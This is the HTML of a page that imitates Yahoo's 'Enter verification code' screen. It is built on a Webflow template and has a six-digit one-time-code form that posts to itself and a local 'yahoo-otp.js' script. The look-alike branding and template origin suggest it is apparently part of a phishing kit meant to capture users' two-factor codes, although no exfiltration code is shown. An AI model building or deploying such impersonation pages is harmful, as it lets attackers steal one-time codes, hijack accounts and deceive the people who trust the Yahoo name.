<!DOCTYPE html>
<html data-wf-page="yahoo-otp" data-wf-site="yahoo">
<head>
  <meta charset="utf-8">
  <title>Enter Verification Code - Yahoo</title>
  <meta content="Enter your Yahoo verification code" name="description">
  <meta content="Enter Verification Code - Yahoo" property="og:title">
  <meta content="Enter your Yahoo verification code" property="og:description">
  <meta content="width=device-width, initial-scale=1" name="viewport">
<link href="css/normalize.css" rel="stylesheet" type="text/css">
  <link href="css/webflow.css" rel="stylesheet" type="text/css">
  <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
  <link href="webflow-yahoo.css" rel="stylesheet" type="text/css">
  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
  <script type="text/javascript">WebFont.load({  google: {    families: ["Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic"]  }});</script>
  <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
  <link href="https://uploads-ssl.webflow.com/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
  <link href="https://uploads-ssl.webflow.com/img/webclip.png" rel="apple-touch-icon">
</head>
<body>
  <div class="yahoo-container">
    <div class="yahoo-logo">
      <h1>yahoo!</h1>
    </div>
    
    <div class="text-center" style="margin-bottom: 30px;">
      <h2 style="font-size: 24px; margin: 0 0 10px 0; color: #333;">Enter verification code</h2>
      <p style="color: #666; margin: 0;">We sent a code to your email address</p>
    </div>

    <div id="error-message" class="error-message"></div>
    <div id="success-message" class="success-message"></div>

    <form id="otp-form" class="yahoo-form" method="POST">
      <input 
        type="text" 
        id="verifyCode" 
        name="verifyCode" 
        class="yahoo-input" 
        placeholder="Enter 6-digit code" 
        required 
        maxlength="6"
        pattern="[0-9]{6}"
        autocomplete="one-time-code"
        style="text-align: center; font-size: 24px; letter-spacing: 5px;"
      >
      
      <button type="submit" id="submit-btn" class="yahoo-button">
        Verify
      </button>
    </form>

    <div class="text-center" style="margin-top: 20px;">
      <p style="color: #666; font-size: 14px; margin-bottom: 10px;">Didn't receive the code?</p>
      <a href="#" id="resend-link" class="yahoo-link">Resend code</a>
    </div>
  </div>

  <script src="yahoo-otp.js"></script>
</body>
</html>
